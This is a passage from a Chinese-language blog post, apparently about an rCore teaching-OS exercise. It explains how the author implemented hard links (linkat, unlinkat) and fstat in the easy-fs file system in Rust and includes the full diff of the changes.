<code>name</code> 的目录项移除（为了实现的方便，可以直接用空的目录项覆写）。</li></ol><blockquote><p>在我的测试中，使用 <code>inode.clear()</code> 清空文件 inode 和数据内存空间的操作可能会在测试样例 <code>ch6_file3</code> 处超时，但测试样例不会对此进行测试，因此如果出现超时的情况，可以考虑移除这一操作。</p></blockquote><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token comment">/// Remove a hard link with name</span><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">unlinkat</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> name<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">isize</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// get inode of file with name</span>    <span class="token keyword">let</span> inode <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> inode<span class="token punctuation">.</span><span class="token function">is_none</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">let</span> inode <span class="token operator">=</span> inode<span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> is_zero_link <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    inode<span class="token punctuation">.</span><span class="token function">modify_disk_inode</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>dinode<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>        dinode<span class="token punctuation">.</span>nlink <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> dinode<span class="token punctuation">.</span>nlink <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>            is_zero_link <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Test will timeout with the code below, what the fuck??</span>    <span class="token comment">// Free memory of inode and file data</span>    <span class="token keyword">if</span> is_zero_link <span class="token punctuation">&#123;</span>        inode<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> res <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">modify_disk_inode</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>dinode<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Remove(For simplisity, not remove, just set to empty)</span>        <span class="token comment">// the directory entry with name in the ROOT_DIR</span>        <span class="token keyword">let</span> fcnt <span class="token operator">=</span> <span class="token punctuation">(</span>dinode<span class="token punctuation">.</span>size <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token constant">DIRENT_SZ</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>fcnt <span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> <span class="token keyword">mut</span> dirent <span class="token operator">=</span> <span class="token class-name">DirEntry</span><span class="token punctuation">::</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>                dinode<span class="token punctuation">.</span><span class="token function">read_at</span><span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token constant">DIRENT_SZ</span><span class="token punctuation">,</span> dirent<span class="token punctuation">.</span><span class="token function">as_bytes_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>block_device<span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token constant">DIRENT_SZ</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> dirent<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> name <span class="token punctuation">&#123;</span>                dirent <span class="token operator">=</span> <span class="token class-name">DirEntry</span><span class="token punctuation">::</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                dinode<span class="token punctuation">.</span><span class="token function">write_at</span><span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token constant">DIRENT_SZ</span><span class="token punctuation">,</span> dirent<span class="token punctuation">.</span><span class="token function">as_bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>block_device<span class="token punctuation">)</span><span class="token punctuation">;</span>                res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">&#125;</span></code></pre><h3 id="fstat"><a href="#fstat" class="headerlink" title="fstat"></a>fstat</h3><p>第三个需要实现的是获取文件状态的 <code>fstat</code>，相较于 <code>linkat</code> 和 <code>unlinkat</code> 来说要复杂一些。</p><p>首先要解决的问题是：如何根据文件描述符 <code>fd</code> 获取其对应的 <code>Inode</code> 结构？这里必须要明确一个概念，所谓文件描述符，本质上只是一个无符号整型，其值为对应文件在当前进程文件描述符表中的 <strong>索引</strong> 。文件描述符表的元素为一个 trait 对象（在其他面向对象语言中相当于虚基类）<code>dyn File</code>，它表示一个抽象的“文件”实体。该“虚基类”有三种具体实现：标准输入 <code>Stdin</code>、标准输出 <code>Stdout</code> 和普通文件 <code>OSInode</code>，我们需要关注的便是 <code>OSInode</code> 的实现。</p><p>一种直接的想法是直接对 <code>OSInode</code> 数据结构进行扩展，为其实现 <code>fstat</code> 操作。但是请注意，文件描述符表的元素类型为虚基类 <code>File</code>，因此它无法直接调用其“派生类” <code>OSInode</code> 中所实现的方法，因此在这里我选择为 <code>File</code> 这个 trait 添加 <code>get_stat</code> 方法，并在 <code>OSInode</code> 中对其进行具体实现（<code>Stdin</code> 和 <code>Stdout</code> 也要实现，可以选择加一个 <code>panic!(&quot;Not implemented!&quot;);</code> 进行占位）。</p><blockquote><p>我对 Rust 还不太了解，不过我推测这里应该可以使用类似 C++ 中的动态类型转换 <code>dynamic_cast</code> 将 <code>dyn File</code> 类型转换为 <code>OSInode</code>，请读者批评指正。</p></blockquote><p>构建起文件描述符到 <code>Inode</code> 的接口后，便可以开始具体实现 <code>fstat</code> 了，需要获取三个文件状态：inode_id、文件类型（普通文件或目录）、硬链接数量。接下来分别介绍：</p><p>首先是 inode_id，在 rCore 的文件系统实现中，inode_id（索引结点号）和文件描述符类似，也是 <strong>索引</strong> ，指向其对应的 <code>DiskInode</code> 在 inode 位图中的位置。因此我们可以通过 <code>Inode</code> 结构中的 <code>block_id</code> 和 <code>block_offset</code> 将 inode_id 计算出来，计算方式如下：</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token comment">/// Get inode id based upon block id and block offset</span><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">get_ino</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> block_id<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span> block_offset<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">usize</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> inode_size <span class="token operator">=</span> <span class="token function">size_of</span><span class="token punctuation">::</span><span class="token operator">&lt;</span><span class="token class-name">DiskInode</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> inode_cnt <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token constant">BLOCK_SZ</span> <span class="token operator">/</span> inode_size<span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span>block_id <span class="token operator">-</span> <span class="token keyword">self</span><span class="token punctuation">.</span>inode_area_start_block <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token operator">*</span> inode_cnt <span class="token operator">+</span> block_offset <span class="token operator">/</span> inode_size<span class="token punctuation">&#125;</span></code></pre><p>文件类型和硬链接数量的获取比较简单，可以通过使用 <code>read_disk_inode</code> 获取 <code>inode</code> 对应的 <code>DiskInode</code> 的只读引用，并从中读取相关信息即可。</p><h3 id="前向兼容"><a href="#前向兼容" class="headerlink" title="前向兼容"></a>前向兼容</h3><p>前向兼容可以借助 <code>git cherry-pick</code> 命令将其他分支的提交移植到当前分支，有关它的具体用法，可以参考我写的 Chapter5 练习中的介绍。</p><p>需要非常注意的一点是，<code>spawn</code> 系统调用移植后，需要添加 <strong>拷贝父进程文件描述符表</strong> 的操作，否则可能就会导致测试程序无法被正常加载（本章测试进程使用 <code>spawn</code> 系统调用进行创建）。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/easy-fs/src/efs.rs b/easy-fs/src/efs.rsindex 202b9eb..52828c2 100644<span class="token coord">--- a/easy-fs/src/efs.rs</span><span class="token coord">+++ b/easy-fs/src/efs.rs</span><span class="token coord">@@ -1,3 +1,5 @@</span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use core::mem::size_of;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use super::&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    block_cache_sync_all, get_block_cache, Bitmap, BlockDevice, DiskInode, DiskInodeType, Inode,</span><span class="token prefix unchanged"> </span><span class="token line">    SuperBlock,</span></span>@@ -148,4 +150,11 @@ impl EasyFileSystem &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            (block_id - self.data_area_start_block) as usize,</span><span class="token prefix unchanged"> </span><span class="token line">        )</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Get inode id based upon block id and block offset</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_ino(&amp;self, block_id: usize, block_offset: usize) -> usize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inode_size = size_of::&lt;DiskInode>();</span><span class="token prefix inserted">+</span><span class="token line">        let inode_cnt = (BLOCK_SZ / inode_size) as usize;</span><span class="token prefix inserted">+</span><span class="token line">        (block_id - self.inode_area_start_block as usize) * inode_cnt + block_offset / inode_size</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/easy-fs/src/layout.rs b/easy-fs/src/layout.rsindex 0a3ac79..692f5e7 100644<span class="token coord">--- a/easy-fs/src/layout.rs</span><span class="token coord">+++ b/easy-fs/src/layout.rs</span>@@ -70,7 +70,9 @@ impl SuperBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// Type of a disk inode</span><span class="token prefix unchanged"> </span><span class="token line">#[derive(PartialEq)]</span><span class="token prefix unchanged"> </span><span class="token line">pub enum DiskInodeType &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// file type</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    File,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// directory type</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    Directory,</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span>@@ -86,6 +88,7 @@ pub struct DiskInode &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    pub indirect1: u32,</span><span class="token prefix unchanged"> </span><span class="token line">    pub indirect2: u32,</span><span class="token prefix unchanged"> </span><span class="token line">    type_: DiskInodeType,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    pub nlink: u32,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">impl DiskInode &#123;</span></span>@@ -97,6 +100,7 @@ impl DiskInode &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        self.indirect1 = 0;</span><span class="token prefix unchanged"> </span><span class="token line">        self.indirect2 = 0;</span><span class="token prefix unchanged"> </span><span class="token line">        self.type_ = type_;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        self.nlink = 1;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line">    /// Whether this inode is a directory</span><span class="token prefix unchanged"> </span><span class="token line">    pub fn is_dir(&amp;self) -> bool &#123;</span></span>diff --git a/easy-fs/src/lib.rs b/easy-fs/src/lib.rsindex 822c237..d146f19 100644<span class="token coord">--- a/easy-fs/src/lib.rs</span><span class="token coord">+++ b/easy-fs/src/lib.rs</span>@@ -16,3 +16,4 @@ pub use block_dev::BlockDevice;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">pub use efs::EasyFileSystem;</span><span class="token prefix unchanged"> </span><span class="token line">use layout::*;</span><span class="token prefix unchanged"> </span><span class="token line">pub use vfs::Inode;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pub use layout::DiskInodeType;</span></span>\ No newline at end of filediff --git a/easy-fs/src/vfs.rs b/easy-fs/src/vfs.rsindex 9908385..cb56ad9 100644<span class="token coord">--- a/easy-fs/src/vfs.rs</span><span class="token coord">+++ b/easy-fs/src/vfs.rs</span>@@ -183,4 +183,93 @@ impl Inode &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        &#125;);</span><span class="token prefix unchanged"> </span><span class="token line">        block_cache_sync_all();</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// Create a hard link with new_name for file with old_name</span><span class="token prefix inserted">+</span><span class="token line">    pub fn linkat(&amp;self, old_name: &amp;str, new_name: &amp;str) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        // get inode of file with old_name</span><span class="token prefix inserted">+</span><span class="token line">        let inode = self.find(old_name);</span><span class="token prefix inserted">+</span><span class="token line">        if inode.is_none() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            return -1;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        let inode = inode.unwrap();</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        let mut id = 0;         // inode id</span><span class="token prefix inserted">+</span><span class="token line">        let mut offset = 0;     // last position of data of inode</span><span class="token prefix inserted">+</span><span class="token line">        self.read_disk_inode(|dinode| &#123;</span><span class="token prefix inserted">+</span><span class="token line">            id = self.find_inode_id(old_name, dinode).unwrap();</span><span class="token prefix inserted">+</span><span class="token line">            offset = dinode.size as usize;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;);</span><span class="token prefix inserted">+</span><span class="token line">        inode.modify_disk_inode(|dinode| &#123;</span><span class="token prefix inserted">+</span><span class="token line">            dinode.nlink += 1;  // increase reference count</span><span class="token prefix inserted">+</span><span class="token line">        &#125;);</span><span class="token prefix inserted">+</span><span class="token line">        let new_entry = DirEntry::new(new_name, id);</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        // insert a new directory entry into ROOT_DIR</span><span class="token prefix inserted">+</span><span class="token line">        self.write_at(offset, new_entry.as_bytes());</span><span class="token prefix inserted">+</span><span class="token line">        0</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Remove a hard link with name</span><span class="token prefix inserted">+</span><span class="token line">    pub fn unlinkat(&amp;self, name: &amp;str) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        // get inode of file with name</span><span class="token prefix inserted">+</span><span class="token line">        let inode = self.find(name);</span><span class="token prefix inserted">+</span><span class="token line">        if inode.is_none() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            return -1;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        let inode = inode.unwrap();</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        let mut is_zero_link = false;</span><span class="token prefix inserted">+</span><span class="token line">        inode.modify_disk_inode(|dinode| &#123;</span><span class="token prefix inserted">+</span><span class="token line">            dinode.nlink -= 1;</span><span class="token prefix inserted">+</span><span class="token line">            if dinode.nlink == 0 &#123;</span><span class="token prefix inserted">+</span><span class="token line">                is_zero_link = true;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;);</span><span class="token prefix inserted">+</span><span class="token line">        // Test will timeout with the code below, what the fuck??</span><span class="token prefix inserted">+</span><span class="token line">        // Free memory of inode and file data</span><span class="token prefix inserted">+</span><span class="token line">        // if is_zero_link &#123;</span><span class="token prefix inserted">+</span><span class="token line">        //     inode.clear();</span><span class="token prefix inserted">+</span><span class="token line">        // &#125;</span><span class="token prefix inserted">+</span><span class="token line">        </span><span class="token prefix inserted">+</span><span class="token line">        let mut res = -1;</span><span class="token prefix inserted">+</span><span class="token line">        self.modify_disk_inode(|dinode| &#123;</span><span class="token prefix inserted">+</span><span class="token line">            // Remove(For simplisity, not remove, just set to empty) </span><span class="token prefix inserted">+</span><span class="token line">            // the directory entry with name in the ROOT_DIR</span><span class="token prefix inserted">+</span><span class="token line">            let fcnt = (dinode.size as usize) / DIRENT_SZ;</span><span class="token prefix inserted">+</span><span class="token line">            for i in 0..fcnt &#123;</span><span class="token prefix inserted">+</span><span class="token line">                let mut dirent = DirEntry::empty();</span><span class="token prefix inserted">+</span><span class="token line">                assert_eq!(</span><span class="token prefix inserted">+</span><span class="token line">                    dinode.read_at(i * DIRENT_SZ, dirent.as_bytes_mut(), &amp;self.block_device),</span><span class="token prefix inserted">+</span><span class="token line">                    DIRENT_SZ</span><span class="token prefix inserted">+</span><span class="token line">                );</span><span class="token prefix inserted">+</span><span class="token line">                if dirent.name() == name &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    dirent = DirEntry::empty();</span><span class="token prefix inserted">+</span><span class="token line">                    dinode.write_at(i * DIRENT_SZ, dirent.as_bytes(), &amp;self.block_device);</span><span class="token prefix inserted">+</span><span class="token line">                    res = 0;</span><span class="token prefix inserted">+</span><span class="token line">                    break;</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;);</span><span class="token prefix inserted">+</span><span class="token line">        res</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Get nlink of the inode</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_nlink(&amp;self) -> u32 &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut nlink = 0;</span><span class="token prefix inserted">+</span><span class="token line">        self.read_disk_inode(|dinode| &#123;</span><span class="token prefix inserted">+</span><span class="token line">            nlink = dinode.nlink;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;);</span><span class="token prefix inserted">+</span><span class="token line">        nlink</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Get file type of the inode</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_file_type(&amp;self) -> DiskInodeType &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut ftype = DiskInodeType::File;</span><span class="token prefix inserted">+</span><span class="token line">        self.read_disk_inode(|dinode| &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if dinode.is_dir() &#123;</span><span class="token prefix inserted">+</span><span class="token line">                ftype = DiskInodeType::Directory;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;);</span><span class="token prefix inserted">+</span><span class="token line">        ftype</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Get inode number of the inode</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_ino(&amp;self) -> u32 &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let fs = self.fs.lock();</span><span class="token prefix inserted">+</span><span class="token line">        fs.get_ino(self.block_id, self.block_offset) as u32</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token coord">--- a/os/src/config.rs</span><span class="token coord">+++ b/os/src/config.rs</span>@@ -25,3 +25,5 @@ pub const CLOCK_FREQ: usize = 12500000;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">pub const MEMORY_END: usize = 0x88000000;</span><span class="token prefix unchanged"> </span><span class="token line">/// The base address of control registers in Virtio_Block device</span><span class="token prefix unchanged"> </span><span class="token line">pub const MMIO: &amp;[(usize, usize)] = &amp;[(0x10001000, 0x1000)];</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">/// big constant for process scheduling</span><span class="token prefix inserted">+</span><span class="token line">pub const BIG_STRIDE: isize = 1000_000;</span></span>diff --git a/os/src/fs/inode.rs b/os/src/fs/inode.rsindex 3f1f208..7c63086 100644<span class="token coord">--- a/os/src/fs/inode.rs</span><span class="token coord">+++ b/os/src/fs/inode.rs</span><span class="token coord">@@ -4,14 +4,14 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//!</span><span class="token prefix unchanged"> </span><span class="token line">//! `UPSafeCell&lt;OSInodeInner>` -> `OSInode`: for static `ROOT_INODE`,we</span><span class="token prefix unchanged"> </span><span class="token line">//! need to wrap `OSInodeInner` into `UPSafeCell`</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use super::File;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use super::&#123;File, Stat, StatMode&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::drivers::BLOCK_DEVICE;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::mm::UserBuffer;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::UPSafeCell;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::sync::Arc;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::vec::Vec;</span><span class="token prefix unchanged"> </span><span class="token line">use bitflags::*;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use easy_fs::&#123;EasyFileSystem, Inode&#125;;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use easy_fs::&#123;DiskInodeType, EasyFileSystem, Inode&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use lazy_static::*;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// inode in memory</span></span>@@ -55,6 +55,7 @@ impl OSInode &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">lazy_static! &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// The inode of root directory</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    pub static ref ROOT_INODE: Arc&lt;Inode> = &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        let efs = EasyFileSystem::open(BLOCK_DEVICE.clone());</span><span class="token prefix unchanged"> </span><span class="token line">        Arc::new(EasyFileSystem::root_inode(&amp;efs))</span></span>@@ -155,4 +156,15 @@ impl File for OSInode &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        &#125;</span><span class="token prefix unchanged"> </span><span class="token line">        total_write_size</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    fn get_stat(&amp;self) -> Stat &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let ino = inner.inode.get_ino() as u64;</span><span class="token prefix inserted">+</span><span class="token line">        let mode = match inner.inode.get_file_type() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            DiskInodeType::File => StatMode::FILE,</span><span class="token prefix inserted">+</span><span class="token line">            DiskInodeType::Directory => StatMode::DIR,</span><span class="token prefix inserted">+</span><span class="token line">        &#125;;</span><span class="token prefix inserted">+</span><span class="token line">        let nlink = inner.inode.get_nlink();</span><span class="token prefix inserted">+</span><span class="token line">        Stat::new(ino, mode, nlink)</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/os/src/fs/mod.rs b/os/src/fs/mod.rsindex 4c99179..522eb4f 100644<span class="token coord">--- a/os/src/fs/mod.rs</span><span class="token coord">+++ b/os/src/fs/mod.rs</span>@@ -15,6 +15,8 @@ pub trait File: Send + Sync &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    fn read(&amp;self, buf: UserBuffer) -> usize;</span><span class="token prefix unchanged"> </span><span class="token line">    /// write to the file from buf, return the number of bytes written</span><span class="token prefix unchanged"> </span><span class="token line">    fn write(&amp;self, buf: UserBuffer) -> usize;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// get Stat of the inode</span><span class="token prefix inserted">+</span><span class="token line">    fn get_stat(&amp;self) -> Stat;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// The stat of a inode</span></span>@@ -33,6 +35,19 @@ pub struct Stat &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    pad: [u64; 7],</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">impl Stat &#123;</span><span class="token prefix inserted">+</span><span class="token line">    /// Create a new Stat with default dev and pad</span><span class="token prefix inserted">+</span><span class="token line">    pub fn new(ino: u64, mode: StatMode, nlink: u32) -> Stat &#123;</span><span class="token prefix inserted">+</span><span class="token line">        Stat &#123;</span><span class="token prefix inserted">+</span><span class="token line">            dev: 0,</span><span class="token prefix inserted">+</span><span class="token line">            ino,</span><span class="token prefix inserted">+</span><span class="token line">            mode,</span><span class="token prefix inserted">+</span><span class="token line">            nlink,</span><span class="token prefix inserted">+</span><span class="token line">            pad: [0; 7],</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">bitflags! &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    /// The mode of a inode</span><span class="token prefix unchanged"> </span><span class="token line">    /// whether a directory or a file</span></span>@@ -46,5 +61,5 @@ bitflags! &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">pub use inode::&#123;list_apps, open_file, OSInode, OpenFlags&#125;;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pub use inode::&#123;list_apps, open_file, OSInode, OpenFlags, ROOT_INODE&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">pub use stdio::&#123;Stdin, Stdout&#125;;</span></span>diff --git a/os/src/fs/stdio.rs b/os/src/fs/stdio.rsindex 6075a65..8b5c36f 100644<span class="token coord">--- a/os/src/fs/stdio.rs</span><span class="token coord">+++ b/os/src/fs/stdio.rs</span><span class="token coord">@@ -1,5 +1,5 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//!Stdin &amp; Stdout</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use super::File;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use 